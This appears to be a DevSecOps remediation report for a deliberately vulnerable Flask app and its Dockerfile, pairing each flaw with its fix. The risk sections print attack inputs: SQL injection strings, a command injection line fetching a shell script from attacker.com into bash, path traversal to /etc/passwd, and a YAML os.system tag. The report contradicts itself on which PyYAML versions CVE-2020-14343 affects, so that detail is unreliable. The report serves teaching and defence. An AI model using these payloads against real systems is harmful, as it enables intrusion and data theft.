# Remediation Report — DevSecOps Pipeline

> **NexusCore Technologies** | Security Engineering Review  
> Branch: `hardened` | Base: `main`  
> Reviewed against: OWASP Top 10 2021, CIS Docker Benchmark v1.6, MITRE ATT&CK v14

This document provides the full before/after technical breakdown for every intentional vulnerability in the `main` branch. For each finding: what was wrong, what the attacker could do, the OWASP/CVE/CIS reference, and the exact fix applied.

---

## Contents

1. [Dockerfile Findings](#1-dockerfile-findings)
2. [Flask Application Findings](#2-flask-application-findings)
3. [SCA — Dependency CVEs](#3-sca--dependency-cves)

---

## 1. Dockerfile Findings

### Finding D-01 — Mutable base image tag, no digest pin

| | |
|---|---|
| **Severity** | 🟠 High |
| **Standard** | MITRE ATT&CK T1195.002 — Compromise Software Supply Chain |
| **CIS Benchmark** | 4.8 — Ensure images are scanned and rebuilt with updated packages |

**Vulnerable:**
```dockerfile
FROM python:3.9
```

**Risk:** `python:3.9` is a version tag, not `latest`, but version tags are mutable. The Python Docker team can silently update what `python:3.9` resolves to. A compromised upstream image becomes part of every build without any source code change.

**Fixed:**
```dockerfile
FROM python:3.9-slim@sha256:8b7b7b7c...
```

**Why it works:** A SHA digest is a cryptographic hash of the exact image manifest. If the upstream image changes in any way, the digest will not match and the build fails rather than silently pulling a different image.

---

### Finding D-02 — Container runs as root

| | |
|---|---|
| **Severity** | 🔴 Critical |
| **Standard** | CIS Docker Benchmark 4.1 — Ensure a user for the container has been created |
| **CVSS** | Not scored independently — amplifies severity of any RCE finding |

**Vulnerable:**
```dockerfile
# No USER instruction - process runs as UID 0
```

**Risk:** Any RCE vulnerability in the application immediately grants the attacker root inside the container. Root access inside a container significantly lowers the bar for container escape to the host.

**Fixed:**
```dockerfile
RUN groupadd --gid 1001 appgroup && \
    useradd --uid 1001 --gid appgroup --shell /bin/sh --create-home appuser
# ...
USER appuser
```

**Why it works:** The application process runs as UID 1001 with only the permissions it needs. An attacker who achieves RCE is constrained to that user's permissions.

---

### Finding D-03 — Unnecessary packages installed

| | |
|---|---|
| **Severity** | 🟠 High |
| **Standard** | CIS Docker Benchmark 4.3 — Ensure unnecessary packages are not installed |

**Vulnerable:**
```dockerfile
RUN apt-get update && apt-get install -y \
    curl wget vim net-tools
```

**Risk:** None of these packages are required at runtime. Post-exploitation each is a pivot tool: `curl`/`wget` enable payload download, `net-tools` enables network reconnaissance, `vim` is a documented GTFObin for privilege escalation and shell escape.

**Fixed:**
```dockerfile
RUN apt-get update && apt-get install -y --no-install-recommends \
    libsqlite3-0 \
    && rm -rf /var/lib/apt/lists/*
```

**Why it works:** Only the genuine runtime dependency is installed. The attack surface shrinks to what the application actually needs.

---

### Finding D-04 — No HEALTHCHECK instruction

| | |
|---|---|
| **Severity** | 🟡 Medium |
| **Standard** | CIS Docker Benchmark 4.6 — Ensure HEALTHCHECK instructions have been added |

**Vulnerable:**
```dockerfile
# No HEALTHCHECK instruction
```

**Risk:** Without `HEALTHCHECK`, Docker and container orchestrators (ECS, Kubernetes) cannot detect whether the application process is alive and serving requests. A crashed or deadlocked container continues to receive traffic with no automated recovery.

**Fixed:**
```dockerfile
HEALTHCHECK --interval=30s --timeout=5s --start-period=10s --retries=3 \
    CMD curl -f http://localhost:5000/health || exit 1
```

**Why it works:** The orchestrator polls `/health` every 30 seconds. Three consecutive failures mark the container unhealthy and trigger automated restart, restoring service without manual intervention.

---

### Finding D-05 — Shell form CMD

| | |
|---|---|
| **Severity** | 🟡 Medium |
| **Standard** | Docker best practice — exec form for signal handling |

**Vulnerable:**
```dockerfile
CMD python src/vulnerable_app.py
```

**Risk:** Shell form spawns `/bin/sh -c` as a wrapper. `docker stop` sends SIGTERM to the shell process, not to Python. Python never receives a graceful shutdown signal and is force-killed after the stop timeout, dropping in-flight requests and leaving database connections open.

**Fixed:**
```dockerfile
CMD ["python", "src/remediated_app.py"]
```

**Why it works:** Exec form delivers signals directly to the Python process as PID 1. The application handles SIGTERM gracefully, completing in-flight requests before exit.

---

## 2. Flask Application Findings

### Finding A-01 — Hardcoded credentials

| | |
|---|---|
| **Severity** | 🔴 Critical |
| **OWASP** | A02:2021 — Cryptographic Failures |
| **CWE** | CWE-798 — Use of Hard-coded Credentials |

**Vulnerable:**
```python
DATABASE_PASSWORD = "super_secret_password_123"
API_KEY = "sk-1234567890abcdef"
```

**Risk:** Credentials committed to source control are permanently compromised. Git history is immutable — even if deleted in a later commit, the secret exists in every clone and fork taken before deletion. Gitleaks detects both values by pattern matching against known secret formats.

**Fixed:**
```python
DATABASE_PASSWORD = os.environ.get("DATABASE_PASSWORD", "")
API_KEY = os.environ.get("API_KEY", "")
```

**Why it works:** Credentials are injected at runtime via AWS Secrets Manager or HashiCorp Vault. The application binary never holds the secret — it is not present in the image, the source code, or git history.

---

### Finding A-02 — SQL Injection

| | |
|---|---|
| **Severity** | 🔴 Critical |
| **OWASP** | A03:2021 — Injection |
| **CWE** | CWE-89 — SQL Injection |
| **CVSSv3** | 9.8 Critical |

**Vulnerable:**
```python
query = f"SELECT * FROM users WHERE username = '{username}'"
cursor.execute(query)
```

**Risk:** An attacker who controls `username` controls the WHERE clause. `' OR '1'='1` returns every row. `'; DROP TABLE users; --` destroys the table. `' UNION SELECT password FROM admin_users --` exfiltrates credentials from other tables.

**Fixed:**
```python
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
```

**Why it works:** The database driver sends the query text and data as separate wire protocol messages. User input is always treated as a literal value — it can never be interpreted as SQL syntax regardless of what characters it contains.

---

### Finding A-03 — Command Injection

| | |
|---|---|
| **Severity** | 🔴 Critical |
| **OWASP** | A03:2021 — Injection |
| **CWE** | CWE-78 — OS Command Injection |
| **CVSSv3** | 9.8 Critical |
| **MITRE ATT&CK** | T1059.004 — Unix Shell |

**Vulnerable:**
```python
result = subprocess.check_output(f"ping -c 1 {host}", shell=True)
```

**Risk:** `shell=True` passes the full string to `/bin/sh`. Input of `8.8.8.8; cat /etc/passwd` executes as two separate commands. Input of `8.8.8.8; curl attacker.com/shell.sh | bash` achieves full remote code execution.

**Fixed:** Endpoint removed entirely.

**Why it works:** There is no safe pattern for passing arbitrary user-controlled strings to a shell command. If ping diagnostics are genuinely required, the correct implementation uses `shell=False` with a strict `ipaddress.ip_address()` allowlist validation — user input never reaches the shell.

---

### Finding A-04 — Server-Side Template Injection (SSTI)

| | |
|---|---|
| **Severity** | 🔴 Critical |
| **OWASP** | A03:2021 — Injection |
| **CWE** | CWE-94 — Code Injection |
| **CVSSv3** | 9.8 Critical |

**Vulnerable:**
```python
template = f"<h1>Hello {name}!</h1>"
return render_template_string(template)
```

**Risk:** User input interpolated into a Jinja2 template string before rendering. Input of `{{config}}` leaks the entire Flask configuration object including secret keys. A polyglot payload using `__class__.__mro__` traversal achieves full remote code execution inside the Python process.

**Fixed:**
```python
return f"Hello {name}!", 200, {"Content-Type": "text/plain"}
```

**Why it works:** User input is returned as data with a plain text content type. The Jinja2 engine is never invoked — there is no template to inject into.

---

### Finding A-05 — Insecure YAML Deserialisation

| | |
|---|---|
| **Severity** | 🔴 Critical |
| **CVE** | CVE-2020-14343 |
| **CVSSv3** | 9.8 Critical |
| **OWASP** | A08:2021 — Software and Data Integrity Failures |

**Vulnerable:**
```python
config = yaml.load(config_data, Loader=yaml.FullLoader)
```

**Risk:** Even `FullLoader` can deserialise Python objects via `!!python/object/apply:os.system ["id"]` tags, executing arbitrary OS commands. The CVE was specifically raised against FullLoader in PyYAML < 5.4.

**Fixed:**
```python
config = yaml.safe_load(config_data)
```

**Why it works:** `safe_load` only deserialises standard YAML scalars, sequences, and mappings. It raises `YAMLError` on any `!!python/` tag — malicious objects cannot be constructed.

---

### Finding A-06 — Path Traversal

| | |
|---|---|
| **Severity** | 🟠 High |
| **OWASP** | A01:2021 — Broken Access Control |
| **CWE** | CWE-22 — Path Traversal |
| **CVSSv3** | 7.5 High |

**Vulnerable:**
```python
with open(f"/app/files/{filename}", 'r') as f:
    return f.read()
```

**Risk:** Input of `../../etc/passwd` reads arbitrary files outside the intended directory. Input of `../../proc/self/environ` can leak environment variables including injected secrets.

**Fixed:**
```python
BASE_FILES_DIR = os.path.realpath("/app/files")
requested_path = os.path.realpath(os.path.join(BASE_FILES_DIR, filename))
if not requested_path.startswith(BASE_FILES_DIR + os.sep):
    abort(400)
```

**Why it works:** `os.path.realpath()` resolves all `..` components and symlinks before the allowlist check. The escape is detected before the file is opened, regardless of how many `../` sequences are chained.

---

### Finding A-07 — Debug mode enabled in production

| | |
|---|---|
| **Severity** | 🔴 Critical |
| **OWASP** | A05:2021 — Security Misconfiguration |
| **CWE** | CWE-94 — Code Injection (via Werkzeug debugger PIN bypass) |

**Vulnerable:**
```python
app.run(host='0.0.0.0', port=5000, debug=True)
```

**Risk:** `debug=True` enables the Werkzeug interactive debugger — a full Python REPL rendered on every unhandled exception page. Any attacker who can trigger an unhandled exception (trivial given the other vulnerabilities) has immediate unauthenticated remote code execution directly from the browser.

**Fixed:**
```python
app.run(host='0.0.0.0', port=5000, debug=False)
```

**Why it works:** The Werkzeug debugger is disabled. In production the application runs behind gunicorn, not the Flask development server — `debug=False` is enforced at the WSGI layer.

---

## 3. SCA — Dependency CVEs

The following CVEs are present in `requirements.txt` on the `main` branch. Patched versions are pinned in `requirements-hardened.txt` on this branch.

---

### Finding S-01 — CVE-2020-14343 in PyYAML 5.4.1

| | |
|---|---|
| **Severity** | 🔴 Critical |
| **CVSSv3** | 9.8 Critical |
| **OWASP** | A06:2021 — Vulnerable and Outdated Components |
| **Affected** | PyYAML < 6.0 |
| **Patched** | PyYAML 6.0+ |

**Vulnerable (`requirements.txt`):**
```
PyYAML==5.4.1
```

**Risk:** Arbitrary Python object deserialisation via `!!python/object/apply` YAML tags. Even `FullLoader` (the supposedly safe loader) was found vulnerable in this CVE. An attacker who can supply YAML to any `yaml.load()` call can execute arbitrary OS commands.

**Fixed (`requirements-hardened.txt`):**
```
PyYAML==6.0.1
```

**Note:** The code-level fix (`yaml.safe_load`) is applied in `src/remediated_app.py`. Defence-in-depth requires both: the safe API call **and** an unaffected library version. One without the other leaves residual risk.

---

### Finding S-02 — Multiple CVEs in Flask 2.0.1

| | |
|---|---|
| **Severity** | 🟠 High (aggregate) |
| **OWASP** | A06:2021 — Vulnerable and Outdated Components |
| **Affected** | Flask 2.0.1 / Werkzeug < 2.3.3 |
| **Patched** | Flask 3.0.3 (pulls Werkzeug 3.0.x) |

**Vulnerable (`requirements.txt`):**
```
Flask==2.0.1
```

**Risk:** Flask 2.0.1 depends on Werkzeug versions that contain multiple known CVEs including path handling and header injection issues. Trivy flags these against the OSV and NVD databases on every scan.

**Fixed (`requirements-hardened.txt`):**
```
Flask==3.0.3
```

**Why this matters:** Dependency CVEs are the most common finding in real security audits. Demonstrating that you understand the difference between a code-level fix and a dependency-level fix — and that defence-in-depth requires both — is a key differentiator at interview.

---

*Remediation report prepared by Aurelien Kumarathas. All findings reference the `main` branch at the time of this review. See [PR #1](https://github.com/AurelienKumarathas/devsecops-pipeline-project-1/pull/1) for the full diff.*
